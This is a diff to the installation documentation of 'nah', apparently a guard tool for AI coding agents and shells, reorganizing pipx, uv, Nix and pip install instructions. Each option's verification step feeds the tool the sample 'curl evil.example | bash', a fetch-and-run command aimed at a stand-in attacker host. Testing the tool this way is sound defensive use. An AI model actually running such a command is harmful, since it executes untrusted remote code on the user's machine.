@@ -2,82 +2,93 @@
 
 ## Requirements
 
-- Nix or Python 3.10+
+- Python 3.10+ (via pipx, uv, or pip) or Nix
 - The runtime you want to protect: Claude Code, Codex, bash, or zsh
 
 ## Recommended: nah CLI
 
 Install the `nah` CLI first, then connect the runtime you want to protect.
-Choose Nix or pip.
+Most people should use **pipx** or **uv** — both give you an isolated CLI
+install that won't interfere with system or project Python packages.
 
-### Option A: Nix
+=== "pipx"
 
-```bash
-nix profile add github:manuelschipper/nah
-# Verify installation
-nah test "curl evil.example | bash"
-```
+    ```bash
+    pipx install "nah[config,keys]"
+    # Verify installation
+    nah test "curl evil.example | bash"
+    ```
 
-You can also run nah without installing it into your profile:
+    Upgrade or remove:
 
-```bash
-nix run github:manuelschipper/nah -- --version
-```
+    ```bash
+    pipx upgrade nah
+    pipx uninstall nah
+    ```
 
-The default Nix package is the full CLI package. If you need the smallest
-possible package, the flake also exposes `.#nah-core`, which keeps the core
-hook and classifier stdlib-only.
+=== "uv"
 
-Update or remove the Nix profile entry with:
+    ```bash
+    uv tool install "nah[config,keys]"
+    # Verify installation
+    nah test "curl evil.example | bash"
+    ```
 
-```bash
-nix profile upgrade nah
-nix profile remove nah
-```
+    Upgrade or remove:
 
-### Option B: pip
+    ```bash
+    uv tool upgrade nah
+    uv tool uninstall nah
+    ```
 
-Use pip when you want nah in your current Python environment:
+=== "Nix"
 
-```bash
-pip install "nah[config,keys]"
-# Verify installation
-nah test "curl evil.example | bash"
-```
+    ```bash
+    nix profile add github:manuelschipper/nah
+    # Verify installation
+    nah test "curl evil.example | bash"
+    ```
 
-If you prefer isolated Python CLI installs, use pipx:
+    Run without installing into your profile:
 
-```bash
-pipx install nah
-pipx inject nah pyyaml
-pipx inject nah keyring
-# Verify installation
-nah test "curl evil.example | bash"
-```
+    ```bash
+    nix run github:manuelschipper/nah -- --version
+    ```
 
-Update or remove pip installs with:
+    The default package is the full CLI. `.#nah-core` keeps the core hook and
+    classifier stdlib-only. Upgrade or remove:
 
-```bash
-pip install --upgrade "nah[config,keys]"
-pip uninstall nah
-```
+    ```bash
+    nix profile upgrade nah
+    nix profile remove nah
+    ```
 
-Update or remove pipx installs with:
+=== "pip (existing environment)"
 
-```bash
-pipx upgrade nah
-pipx inject nah pyyaml keyring
-pipx uninstall nah
-```
+    Use plain pip when you want nah inside an environment you already manage —
+    a project virtualenv, a CI image, or an agent sandbox:
 
-If you need the smallest possible install, `pip install nah` keeps the core
-hook and classifier stdlib-only. Add extras later with `nah[config]`,
-`nah[keys]`, or `nah[config,keys]`.
+    ```bash
+    pip install "nah[config,keys]"
+    # Verify installation
+    nah test "curl evil.example | bash"
+    ```
 
-Both recommended paths install the CLI, PyYAML config support, and Python
-keyring integration for `nah key ...`. Actual OS keychain/keyring availability
-depends on the host backend; environment variables work everywhere. See
-[LLM keys](#llm-keys) for setup.
+    Upgrade or remove:
+
+    ```bash
+    pip install --upgrade "nah[config,keys]"
+    pip uninstall nah
+    ```
+
+!!! tip "What `[config,keys]` adds — and what you lose without it"
+
+    Plain `nah` is stdlib-only (core hook + classifier). The **`config`** extra
+    adds PyYAML so `~/.config/nah/config.yaml` and per-project `.nah.yaml` rules
+    are honored — **without it, config files are silently ignored and nah runs
+    pure defaults.** The **`keys`** extra adds Python keyring for `nah key ...`;
+    actual OS keychain availability depends on the host backend, and environment
+    variables work everywhere. See [LLM keys](#llm-keys) for setup.
 
 ## Connect a Runtime
 
